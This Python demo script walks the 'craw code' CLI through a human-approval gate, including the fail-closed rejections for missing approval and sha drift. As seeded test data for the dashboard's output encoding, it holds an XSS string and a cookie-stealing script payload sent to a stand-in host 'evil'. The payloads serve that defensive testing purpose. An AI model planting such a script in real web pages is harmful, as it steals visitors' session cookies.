"""The ``craw code`` end-to-end tour — a deterministic, mock-only walkthrough.

This is the Wave-6 demo that proves the *whole* ``craw code`` loop works for real, end to
end, with **no live model call and no network**: it drives the real verbs through
:func:`crawfish.code.cli.run_code` against a freshly ``craw code init``'d project, captures
each step's versioned ``--json`` envelope and exit code, and walks the human-approval gate
through its full ``propose → reject → approve → apply`` lifecycle — including the two
fail-closed rejections (no-approval and on-disk-sha-drift) that are the load-bearing
security contract.

Why it is deterministic. Every verb here reads the project on disk and emits a typed
projection; none of them call a model. The two places a model *would* run — a live
optimization trial and a live pipeline run — are stood in for honestly: ``optimize`` runs in
its $0 ``refine`` mode (a pure replay over the recorded baseline), and a "failed run" is
seeded directly into the ``.crawfish/`` ledger through the same
:class:`~crawfish.observe.ObserverSurface` a real engine run writes through, so ``dashboard``
/ ``review`` / ``diagnose`` read a real ledger, not a mock. There is no ``craw code run``
verb; the engine is exercised by writing the ledger the engine would write.

Run it as a script to watch the tour print every envelope::

    uv run python demo/craw-code-tour/tour.py

or import :func:`run_tour` and assert on the returned :class:`TourResult` (the pytest in
``packages/crawfish/tests/test_craw_code_tour.py`` does exactly that).
"""

from __future__ import annotations

import io
import json
import os
import time
from collections.abc import Iterator
from contextlib import contextmanager, redirect_stderr, redirect_stdout
from dataclasses import dataclass, field
from pathlib import Path

from crawfish.code.cli import run_code

#: The component the tour authors and operates. ``craw code init`` scaffolds it for us, so the
#: tour never hand-writes a definition — it drives the same scaffold a user would get.
COMPONENT = "definitions/triage-bot"
#: The deployed pipeline name (the scaffolded definition's directory stem).
PIPELINE = "triage-bot"
#: The run id the tour seeds into the ledger so dashboard/review/diagnose have a real run to read.
SEED_RUN_ID = "run-tour-1"


@dataclass(frozen=True)
class Step:
    """One captured tour step: the argv we ran, its exit code, and its parsed envelope.

    ``ok`` records whether the exit code matched what the step *expected* — a fail-closed
    rejection is a *successful* step (it expects exit ``4``), so ``ok`` is not "exit == 0".
    """

    name: str
    argv: list[str]
    exit_code: int
    expected_exit: int
    envelope: dict[str, object]

    @property
    def ok(self) -> bool:
        return self.exit_code == self.expected_exit


@dataclass
class TourResult:
    """The whole tour's captured steps, addressable by name for assertions."""

    steps: list[Step] = field(default_factory=list)

    def by_name(self, name: str) -> Step:
        for step in self.steps:
            if step.name == name:
                return step
        raise KeyError(name)

    @property
    def all_ok(self) -> bool:
        return all(step.ok for step in self.steps)


@contextmanager
def _chdir(target: Path) -> Iterator[None]:
    """Run a block with the process cwd at ``target`` (``craw code new`` resolves cwd-relative)."""
    prior = Path.cwd()
    os.chdir(target)
    try:
        yield
    finally:
        os.chdir(prior)


def _invoke(argv: list[str]) -> tuple[int, dict[str, object]]:
    """Drive one ``craw code …`` argv through :func:`run_code`; return (exit, parsed envelope).

    The ``--json`` envelope lands on stdout for success and stderr for the structured
    ``craw.error.v1`` rejection, so we read whichever stream carried the last JSON line — the
    same thing the Claude Code plugin parses off the CLI.
    """
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = run_code(argv)
    text = (out.getvalue() or err.getvalue()).strip()
    envelope: dict[str, object] = {}
    if text:
        try:
            envelope = json.loads(text.splitlines()[-1])
        except json.JSONDecodeError:
            envelope = {"_raw": text.splitlines()[-1]}
    return code, envelope


def _record_human_approval(component: str, sha: str, *, org: str = "local") -> None:
    """Record the out-of-band human approval for ``(component, sha)`` — the operator action.

    This is the console/operator entry point (:meth:`ApprovalLedger.record_decision`), *not* a
    fluid-reachable CLI verb: fluid session data can never call it, so it can never auto-approve.
    The tour calls it directly to stand in for a human clicking "approve" in the console.
    """
    from crawfish.code.gate import ApprovalLedger
    from crawfish.manage import store_for_dir

    store = store_for_dir(component)
    try:
        ApprovalLedger(store, org_id=org).record_decision(component, sha, approve=True)
    finally:
        store.close()


def _seed_failed_run(project: Path, *, org: str = "local") -> None:
    """Write a realistic *failed* run into the project ledger the way the engine would.

    The dashboard/review/diagnose verbs read the ``.crawfish/`` ledger through the
    :class:`~crawfish.observe.ObserverSurface`; a real engine run writes a ``RunInfo`` + observer
    events + a DLQ entry + the failing node's emission through that exact surface. We write the
    same records directly (no model call), so the read verbs operate on a genuine ledger rather
    than a mock — keeping the tour honest end to end.
    """
    from crawfish.emission import Emission, EmissionKind, emit
    from crawfish.manage import store_for_dir
    from crawfish.observe import ObserverEvent, ObserverSurface, RunInfo, Severity

    store = store_for_dir(str(project))
    try:
        surface = ObserverSurface(store, org_id=org)
        surface.put_run_info(
            RunInfo(pipeline=PIPELINE, run_id=SEED_RUN_ID, status="failed", version="0.3.1")
        )
        surface.emit(
            ObserverEvent(
                pipeline=PIPELINE,
                kind="failure.rate",
                severity=Severity.CRITICAL,
                # A deliberately injection-shaped detail: the dashboard must OUTPUT-ENCODE this
                # before it reaches HTML (UNFILED-XSS). Carried verbatim in --json (a parser
                # consumes it as a string); the HTML renderer is the layer that neutralizes it.
                detail="3 of 5 failed: <script>alert('xss')</script>",
                run_id=SEED_RUN_ID,
                ts=time.time() - 30,
            )
        )
        emit(
            store,
            Emission(
                kind=EmissionKind.SINK,
                run_id=SEED_RUN_ID,
                org_id=org,
                pipeline=PIPELINE,
                node_id="summarize",
                attrs={"target": "slack", "committed": False},
            ),
            org_id=org,
        )
        store.put_record(
            "dead_letter",
            f"{SEED_RUN_ID}:ticket-42",
            {
                "batch_id": SEED_RUN_ID,
                "item_id": "ticket-42",
                "error": "schema mismatch: invalid label",
                "pipeline": PIPELINE,
                "run_id": SEED_RUN_ID,
            },
            org_id=org,
        )
    finally:
        store.close()


def _xss_demo() -> dict[str, str]:
    """Show the dashboard's output-encoding chokepoint neutralizing the seeded payload.

    The README renders this: a tainted ledger ``detail`` carrying a ``<script>`` beacon, the
    same value after :func:`~crawfish.code.dashboard.encode_field` (inert entity-encoded text),
    and the strict CSP every HTML response carries as defense-in-depth.
    """
    from crawfish.code.dashboard import CSP, Encoding, encode_field

    raw = "<script>fetch('http://evil/'+document.cookie)</script>"
    return {"raw": raw, "encoded": encode_field(raw, Encoding.HTML_BODY), "csp": CSP}


def run_tour(project: Path, *, echo: bool = False) -> TourResult:
    """Run the full ``craw code`` tour against ``project`` and return the captured steps.

    ``project`` must be an empty (or non-existent) directory; the tour ``craw code init``s it,
    authors and prices a component, walks the approval gate through reject→approve→apply (with
    both fail-closed rejections), seeds + reads a failed run, and diagnoses it. With ``echo`` the
    tour prints each step's argv, exit code, and envelope as it goes (the script entry point).
    """
    project = Path(project)
    result = TourResult()

    def step(name: str, argv: list[str], *, expected_exit: int = 0) -> Step:
        code, env = _invoke(argv)
        captured = Step(
            name=name, argv=argv, exit_code=code, expected_exit=expected_exit, envelope=env
        )
        result.steps.append(captured)
        if echo:
            _echo_step(captured)
        return captured

    # 1. init — scaffold a fresh project (no plugin install in the deterministic tour).
    step("init", ["init", "--json", str(project), "--no-plugin"])

    # Everything after init resolves cwd-relative (new) or project-relative (the rest), so the
    # remaining verbs run from inside the project directory.
    with _chdir(project):
        # 2. new — author a *second* component to show the scaffolder (init already gave us
        #    COMPONENT; this proves `new` works and is idempotent-safe alongside it).
        step("new", ["new", "--json", "definition", "summary-bot"])

        # 3. describe — reflect the typed IO boundary of the authored component.
        step("describe", ["describe", "--json", COMPONENT])

        # 4. estimate — the honest cost band (total ≤ expected ≤ worst_case), no model call.
        step("estimate", ["estimate", "--json", COMPONENT, "--items", "5"])

        # 5. sync — reconcile the on-disk project against its ledger (drift report). Run at the
        #    project root, where init's scaffolded .gitignore covers the generated .crawfish/
        #    state, so a freshly-scaffolded project is clean (exit 0, no drift).
        step("sync", ["sync", "--json", "--dir", "."])

        # 6. validate-authoring — the CRA-265 eval: positive fixture loads + gate-clean, the
        #    negative corpus is rejected by the right gate. The authoring safety net.
        step("validate-authoring", ["validate-authoring", "--json"])

        # 7. optimize — $0 refine mode (a pure replay over the recorded baseline; no live trial).
        step("optimize", ["optimize", "--json", COMPONENT, "--mode", "refine", "--seed", "0"])

        # ---- the human-approval gate: propose → reject → propose → (NO approval) → approve → apply
        # 8. propose — stage a typed diff + honest cost band keyed on (component, candidate_sha).
        proposed = step("propose", ["propose", "--json", COMPONENT])
        sha = str(proposed.envelope.get("candidate_sha", ""))

        # 9. apply WITHOUT approval — FAIL CLOSED. no_approval, exit 4 (security, non-retryable),
        #    the spec's granular detail.exit=7. This is the load-bearing gate: an injected agent
        #    cannot promote its own change.
        step("apply_no_approval", ["apply", "--json", COMPONENT, sha], expected_exit=4)

        # 10. reject — a human rejects this candidate; a recorded decision + a $0 pointer rollback.
        step("reject", ["reject", "--json", COMPONENT, sha])

        # 11. re-propose — stage again (idempotent on the same sha) so we can approve THIS sha.
        reproposed = step("re_propose", ["propose", "--json", COMPONENT])
        approved_sha = str(reproposed.envelope.get("candidate_sha", ""))

        # 12. record the human approval (out-of-band operator action — never fluid-reachable).
        _record_human_approval(COMPONENT, approved_sha)

        # 13. apply WITH approval — now it promotes. Exit 0, result "applied".
        step("apply_approved", ["apply", "--json", COMPONENT, approved_sha])

        # 14. SHA DRIFT — approve a sha, then change the component on disk, then apply: REJECTED
        #     even though an approval row exists, because the on-disk sha drifted. Re-propose
        #     required. This is the second fail-closed contract (sec-w5's guard).
        drift_proposed = step("drift_propose", ["propose", "--json", COMPONENT])
        drift_sha = str(drift_proposed.envelope.get("candidate_sha", ""))
        _record_human_approval(COMPONENT, drift_sha)
        _mutate_component(project / COMPONENT)
        step("apply_sha_drift", ["apply", "--json", COMPONENT, drift_sha], expected_exit=4)

        # 15. deploy — register the pipeline + scaffold its default observers.
        step("deploy", ["deploy", "--json", PIPELINE, "--dir", COMPONENT])

        # Seed a realistic failed run so the read verbs have a real ledger to operate on.
        _seed_failed_run(project / COMPONENT)

        # 16. dashboard — the scrubbed, org-scoped --json snapshot (the read-model).
        step("dashboard", ["dashboard", "--json", "--project", COMPONENT])

        # 17. review — the authoring digest over the recent ledger window.
        step("review", ["review", "--json", "--project", COMPONENT])

        # 18. diagnose — correlate the failed run → first failing node + a $0 replay remediation.
        step("diagnose", ["diagnose", "--json", SEED_RUN_ID, "--project", COMPONENT])

    if echo:
        _echo_summary(result)
    return result


def _mutate_component(component_dir: Path) -> None:
    """Change the component on disk so its content sha drifts from an approved sha.

    Appends a line to ``instructions.md`` — a real authoring edit that shifts the content sha,
    so an approval minted for the prior sha is structurally inapplicable (the sha-drift guard).
    """
    instructions = component_dir / "instructions.md"
    instructions.write_text(instructions.read_text() + "\n<!-- post-approval edit -->\n")


def _echo_step(step: Step) -> None:
    """Print one step's argv, exit code, and envelope (the script's per-step trace)."""
    verdict = "ok" if step.ok else "UNEXPECTED"
    print(f"\n$ craw {' '.join(step.argv)}")
    print(f"  exit={step.exit_code} (expected {step.expected_exit}) [{verdict}]")
    print("  " + json.dumps(step.envelope, sort_keys=True)[:400])


def _echo_summary(result: TourResult) -> None:
    """Print the tour summary table + the XSS-encoding demonstration."""
    print("\n" + "=" * 72)
    print("tour summary")
    print("=" * 72)
    for step in result.steps:
        mark = "PASS" if step.ok else "FAIL"
        print(f"  [{mark}] {step.name:<18} exit={step.exit_code}")
    xss = _xss_demo()
    print("\noutput-encoding (UNFILED-XSS) — a tainted ledger detail rendered inert:")
    print(f"  raw     : {xss['raw']}")
    print(f"  encoded : {xss['encoded']}")
    print(f"  csp     : {xss['csp'][:64]}…")
    print(f"\nall steps ok: {result.all_ok}")


def main() -> int:
    """Script entry: run the tour in a throwaway temp project and print every envelope."""
    import tempfile

    with tempfile.TemporaryDirectory(prefix="craw-code-tour-") as tmp:
        project = Path(tmp) / "app"
        result = run_tour(project, echo=True)
    return 0 if result.all_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
